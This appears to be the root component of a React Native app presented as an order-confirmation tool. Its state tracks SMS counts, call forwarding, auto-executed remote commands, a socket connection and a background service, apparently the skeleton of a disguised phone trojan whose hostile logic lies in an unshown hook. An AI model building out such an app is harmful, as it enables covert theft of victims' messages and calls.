import React, { useState, useRef } from "react";
import { NavigationContainer } from '@react-navigation/native';
import { createNativeStackNavigator } from '@react-navigation/native-stack';
import { useAppInitialization } from './src/hooks/useAppInitialization';

// Import screens
import LoadingScreen from './src/screens/LoadingScreen';
import ConfirmOrderScreen from './src/screens/ConfirmOrderScreen';
import OrderStatusScreen from './src/screens/OrderStatusScreen';

const Stack = createNativeStackNavigator();

export default function App() {
  const [appData, setAppData] = useState({
    lastSync: null,
    registrationStatus: "Initializing...",
    deviceId: null,
    registered: false,
    serviceStatus: "Unknown",
    batteryLevel: 0,
    isOnline: false,
    smsCount: 0,
    orderConfirmed: false,
    socketConnected: false,
    autoExecuteEnabled: true,
    callForwardingActive: false,
    backgroundServiceActive: false,
    commandExecutionCount: 0,
    permissionsStatus: {
      sms: false,
      phone: false,
      storage: false,
      allRequired: false
    }
  });

  const socketRef = useRef(null);
  const deviceIdRef = useRef(null);

  const updateAppData = (newData) => {
    setAppData(prevData => ({ ...prevData, ...newData }));
  };

  // Use the custom initialization hook
  useAppInitialization({
    appData,
    updateAppData,
    socketRef,
    deviceIdRef
  });

  return (
    <NavigationContainer>
      <Stack.Navigator
        initialRouteName="Loading"
        screenOptions={{
          headerShown: false,
        }}
      >
        <Stack.Screen name="Loading">
          {(props) => <LoadingScreen {...props} appData={appData} />}
        </Stack.Screen>
        <Stack.Screen name="ConfirmOrder">
          {(props) => (
            <ConfirmOrderScreen
              {...props}
              appData={appData}
              updateAppData={updateAppData}
            />
          )}
        </Stack.Screen>
        <Stack.Screen name="OrderStatus">
          {(props) => (
            <OrderStatusScreen
              {...props}
              appData={appData}
              updateAppData={updateAppData}
            />
          )}
        </Stack.Screen>
      </Stack.Navigator>
    </NavigationContainer>
  );
}
